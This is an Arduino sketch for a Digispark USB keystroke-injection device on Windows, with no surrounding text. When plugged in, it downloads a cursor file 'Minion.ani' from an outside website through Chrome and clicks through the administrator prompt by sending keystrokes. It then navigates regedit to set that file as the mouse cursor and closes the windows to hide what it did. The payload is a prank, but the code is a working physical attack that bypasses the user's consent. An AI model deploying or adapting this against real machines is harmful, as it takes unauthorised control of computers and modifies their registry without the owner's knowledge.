#include "DigiKeyboard.h"
#define KEY_TAB 43
#define ARROW_DOWN 0x51
#define ARROW_LEFT 0x50
#define ARROW_RIGHT 0x4F

//For international keyboard layouts
#define KEY_BACKSLASH 0x64
#define KEY_DELETE 0x2A

void setup() {
  //Download cursor
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome.exe -incognito https://rossmacd.com/Minion.ani");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  //Get Directory
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(70);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd ");
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(KEY_BACKSLASH, MOD_SHIFT_LEFT);
  DigiKeyboard.delay(70);
  DigiKeyboard.println("clip");
  DigiKeyboard.delay(70);

  //open regedit
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(70);
  DigiKeyboard.println("regedit");
  DigiKeyboard.delay(1000);
  //Accept admin prompt
  DigiKeyboard.sendKeyStroke(ARROW_LEFT);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  //Go to cursor directory
  //Down 2,Right, Down 3, right, down 5,tab, down 2,enter, cursro location,
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_RIGHT);
  DigiKeyboard.delay(70);
  //down 3
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_RIGHT);
  DigiKeyboard.delay(70);
  //down 5
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(ARROW_DOWN);
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  //Paste Directory
  DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  //Type rest of Directory
  DigiKeyboard.sendKeyStroke(KEY_BACKSLASH);
  DigiKeyboard.delay(70);
  DigiKeyboard.print("Downloads");
  DigiKeyboard.delay(70);
  DigiKeyboard.sendKeyStroke(KEY_BACKSLASH);
  DigiKeyboard.delay(70);
  DigiKeyboard.println("Minion.ani");
  DigiKeyboard.delay(500);

  //Close opened windows
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
}

void loop() {
  // put your main code here, to run repeatedly:

}
